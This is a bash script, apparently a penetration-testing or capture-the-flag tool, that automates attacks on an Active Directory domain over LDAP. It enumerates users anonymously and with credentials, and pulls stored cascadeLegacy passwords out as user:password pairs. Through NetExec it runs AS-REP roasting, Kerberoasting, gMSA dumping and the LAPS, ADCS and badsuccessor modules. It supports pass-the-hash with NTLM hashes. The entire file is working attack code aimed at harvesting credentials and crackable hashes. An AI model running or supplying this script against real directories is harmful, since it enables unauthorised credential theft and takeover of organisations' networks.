#!/bin/bash
set -uo pipefail
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
IP=""; USER=""; PASS=""; HASH=""; DOMAIN=""; PROTO="ldap"; SCAN_TYPE=""
while getopts "t:u:p:H:d:P:m:" opt; do
  case "$opt" in
    t) IP="$OPTARG" ;; u) USER="$OPTARG" ;; p) PASS="$OPTARG" ;; H) HASH="$OPTARG" ;; d) DOMAIN="$OPTARG" ;; P) PROTO="$OPTARG" ;; m) SCAN_TYPE="$OPTARG" ;;
    *) echo -e "${RED}Usage: $0 [-m unauth|auth] -t <IP> -d <domain> [-u <user> [-p <password> | -H <hash>]] [-P ldap|ldaps]${NC}"; exit 1 ;;
  esac
done
if [[ -z "$SCAN_TYPE" ]]; then
  echo -e "${BLUE}===============================================================${NC}\n${YELLOW} Select LDAP Scan Type:${NC}\n   [1] Unauthenticated / Anonymous LDAP Scan\n   [2] Authenticated LDAP Scan\n${BLUE}===============================================================${NC}"
  read -rp "Enter choice [1/2]: " choice
  case "$choice" in 1) SCAN_TYPE="unauth" ;; 2) SCAN_TYPE="auth" ;; *) echo -e "${RED}[!] Invalid choice. Exiting.${NC}"; exit 1 ;; esac
fi
[[ -z "$IP" ]] && read -rp "Enter target IP (-t): " IP
[[ -z "$DOMAIN" ]] && read -rp "Enter target domain (-d): " DOMAIN
if [[ -z "$IP" || -z "$DOMAIN" ]]; then echo -e "${RED}[-] Error: Target IP and Domain are required.${NC}"; exit 1; fi
BASEDN=$(echo "$DOMAIN" | awk -F. '{for(i=1;i<=NF;i++) printf "DC=%s%s",$i,(i<NF?",":""); print ""}')
URL="${PROTO}://${IP}"
if [[ "$SCAN_TYPE" == "unauth" ]]; then
  OUTDIR="results_noauth_ldap"; mkdir -p "$OUTDIR"
  OUT_MAIN="${OUTDIR}/ldap.txt"; OUT_INFO="${OUTDIR}/ldap_info_ctx.txt"; OUT_PWDNR="${OUTDIR}/ldap_pwdnotreqd.txt"; OUT_CASCADE="${OUTDIR}/ldap_cascade_pwd.txt"; NXC_OUT="${OUTDIR}/ldap_nxc_users.txt"; NXC_USERS="${OUTDIR}/usernames.txt"; NXC_USERS_DESC="${OUTDIR}/users_with_descriptions.txt"
  echo -e "${BLUE}===============================================================${NC}\n${GREEN}[*] Mode: Unauthenticated Scan | Protocol: ${PROTO} | Target: ${IP}${NC}\n${BLUE}===============================================================${NC}"
  echo -e "${YELLOW}[*] Running ldapsearch on $URL ...${NC}"
  ldapsearch -LLL -x -H "$URL" -b "$BASEDN" "(objectClass=user)" | tee "$OUT_MAIN"
  echo -e "${YELLOW}[*] Grepping 'info:' with context...${NC}"
  grep -i -B1 -A2 '^info:' "$OUT_MAIN" | tee "$OUT_INFO" || true
  echo -e "${YELLOW}[*] Grepping UAC entries...${NC}"
  grep -E -B1 -A2 '^userAccountControl:[[:space:]]*[0-9]*32$' "$OUT_MAIN" | tee "$OUT_PWDNR" || true
  echo -e "${YELLOW}[*] Extracting cascadeLegacy creds -> $OUT_CASCADE${NC}"
  awk 'BEGIN{IGNORECASE=1} /^$/ { if(u!="" && p!=""){print u ":" p}; u=""; p=""; next } /^sAMAccountName:[[:space:]]*/ { sub(/^sAMAccountName:[[:space:]]*/,""); u=$0 } /cascadeLegacy/ && /:/ { sub(/^[^:]*:[[:space:]]*/,""); p=$0 } END { if(u!="" && p!=""){print u ":" p} }' "$OUT_MAIN" | tee "$OUT_CASCADE" || true
  echo -e "${YELLOW}[*] Running NetExec LDAP null/guest --users...${NC}"
  for NXC_USER in "" "guest"; do
    echo -e "${GREEN}[*] Running: nxc ldap ${IP} -u \"${NXC_USER}\" -p \"\" --users${NC}"
    CMD=(nxc ldap "${IP}" -u "${NXC_USER}" -p "" --users)
    OUTPUT="$("${CMD[@]}" 2>/dev/null || true)"
    if echo "${OUTPUT}" | grep -q -- '-Username-'; then
      echo "${OUTPUT}" | tee -a "${NXC_OUT}"
      echo "${OUTPUT}" | awk '$5 == "-Username-" { in_table=1; next } in_table && NF >= 6 { username = $5; description = ""; if (NF > 9) { for (i = 10; i <= NF; i++) { description = description $i " " } gsub(/[ \t]+$/, "", description); print username " | " description >> "'"${NXC_USERS_DESC}"'"; print username >> "'"${NXC_USERS}"'" } else { print username >> "'"${NXC_USERS}"'" } }'
    else
      echo -e "${RED}[-] No output or access denied for user '${NXC_USER}'${NC}" | tee -a "${NXC_OUT}"
    fi
  done
  echo -e "${BLUE}===============================================================${NC}\n${GREEN}[*] Done. Results saved in $OUTDIR/${NC}\n${BLUE}===============================================================${NC}"
elif [[ "$SCAN_TYPE" == "auth" ]]; then
  [[ -z "$USER" ]] && read -rp "Enter username (-u): " USER
  if [[ -z "$PASS" && -z "$HASH" ]]; then
    read -rp "Enter password (-p, leave blank to use hash): " PASS; echo
    [[ -z "$PASS" ]] && read -rp "Enter NTLM hash (-H): " HASH
  fi
  OUTDIR="results_auth_ldap"; mkdir -p "$OUTDIR"
  OUT_MAIN="${OUTDIR}/ldap.txt"; OUT_INFO="${OUTDIR}/ldap_info_ctx.txt"; OUT_PWDNR="${OUTDIR}/ldap_pwdnotreqd.txt"; OUT_CASCADE="${OUTDIR}/ldap_cascade_pwd_b64.txt"
  echo -e "${BLUE}===============================================================${NC}\n${GREEN}[*] Mode: Authenticated Scan | Protocol: ${PROTO} | Target: ${IP} | User: ${USER}${NC}\n${BLUE}===============================================================${NC}"
  BINDUSER="${USER}@${DOMAIN}"
  if [[ -n "$PASS" ]]; then
    echo -e "${YELLOW}[*] Running ldapsearch on $URL with $BINDUSER ...${NC}"
    LDAP_SUCCESS=0
    if [[ "$PROTO" == "ldaps" ]]; then
      export LDAPTLS_REQCERT=never
      if ldapsearch -LLL -x -H "$URL" -D "$BINDUSER" -w "$PASS" -b "$BASEDN" "(objectClass=user)" > "$OUT_MAIN" 2>&1; then
        LDAP_SUCCESS=1; cat "$OUT_MAIN"
      else
        cat "$OUT_MAIN"; PROTO="ldap"; URL="ldap://${IP}"
      fi
    fi
    if [[ "$PROTO" == "ldap" && $LDAP_SUCCESS -eq 0 ]]; then
      if ldapsearch -LLL -x -H "$URL" -D "$BINDUSER" -w "$PASS" -b "$BASEDN" "(objectClass=user)" > "$OUT_MAIN" 2>&1; then
        LDAP_SUCCESS=1; cat "$OUT_MAIN"
      else
        if grep -q "Strong.*authentication required" "$OUT_MAIN" 2>/dev/null; then
          export LDAPTLS_REQCERT=never; URL="ldaps://${IP}"
          if ldapsearch -LLL -x -H "$URL" -D "$BINDUSER" -w "$PASS" -b "$BASEDN" "(objectClass=user)" > "$OUT_MAIN" 2>&1; then
            LDAP_SUCCESS=1; cat "$OUT_MAIN"
          else
            cat "$OUT_MAIN"
          fi
        else
          cat "$OUT_MAIN"
        fi
      fi
    fi
    if [[ $LDAP_SUCCESS -eq 0 ]]; then
      echo -e "${RED}[!] All LDAP connection attempts failed!${NC}"
    else
      echo -e "${GREEN}[*] LDAP search successful!${NC}"
      grep -i -B1 -A2 '^info:' "$OUT_MAIN" | tee "$OUT_INFO" || true
      grep -E -B1 -A2 '^userAccountControl:[[:space:]]*[0-9]*32$' "$OUT_MAIN" | tee "$OUT_PWDNR" || true
      awk 'BEGIN{IGNORECASE=1} /^$/ { if(u!="" && p!=""){print u ":" p}; u=""; p=""; next } /^sAMAccountName:[[:space:]]*/ { sub(/^sAMAccountName:[[:space:]]*/,""); u=$0 } /cascadeLegacy/ && /:/ { sub(/^[^:]*:[[:space:]]*/,""); p=$0 } END { if(u!="" && p!=""){print u ":" p} }' "$OUT_MAIN" | tee "$OUT_CASCADE" || true
    fi
  else
    echo -e "${YELLOW}[!] NOTICE: ldapsearch does not support hash authentication. Skipping ldapsearch.${NC}"
  fi
  echo -e "${YELLOW}[*] Running NetExec commands...${NC}"
  if [[ -n "$HASH" ]]; then BASE_CMD="nxc ldap ${IP} -u ${USER} -H ${HASH} -d ${DOMAIN}"; else BASE_CMD="nxc ldap ${IP} -u ${USER} -p ${PASS} -d ${DOMAIN}"; fi
  for flag in --users-export --asreproast --kerberoasting --gmsa; do
    echo -e "${GREEN}[*] Running: ${BASE_CMD} ${flag}${NC}"
    case "$flag" in
      --users-export) ${BASE_CMD} ${flag} "${OUTDIR}/users_export.txt" || true ;;
      --asreproast) ${BASE_CMD} ${flag} "${OUTDIR}/asreprostable_users.txt" || true ;;
      --kerberoasting) ${BASE_CMD} ${flag} "${OUTDIR}/kerberostable_users.txt" || true ;;
      *) ${BASE_CMD} ${flag} || true ;;
    esac
    echo ""
  done
  for module in laps adcs pre2k badsuccessor; do
    echo -e "${GREEN}[*] Running: ${BASE_CMD} -M ${module}${NC}"
    ${BASE_CMD} -M ${module} || true
    echo ""
  done
  echo -e "${BLUE}===============================================================${NC}\n${GREEN}[*] Done. Results saved in $OUTDIR/${NC}\n${BLUE}===============================================================${NC}"
else
  echo -e "${RED}[!] Invalid scan type specified.${NC}"
  exit 1
fi
